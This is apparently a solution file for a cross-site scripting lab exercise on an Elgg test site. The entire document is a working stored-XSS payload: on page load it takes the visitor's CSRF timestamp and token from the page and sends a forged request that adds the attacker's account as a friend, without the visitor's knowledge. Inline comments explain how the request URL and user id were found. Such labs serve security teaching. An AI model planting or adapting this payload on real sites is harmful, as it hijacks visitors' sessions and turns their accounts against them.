<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	/* 
	Found the url from browser network inspection after adding Samy as a friend from Alice's account. 
	*/
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token; 

	// console.log(elgg) in the browser to find the guid property
	// Condition to check if the user is not Samy
	if(elgg.session.user.guid != 47) {
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>
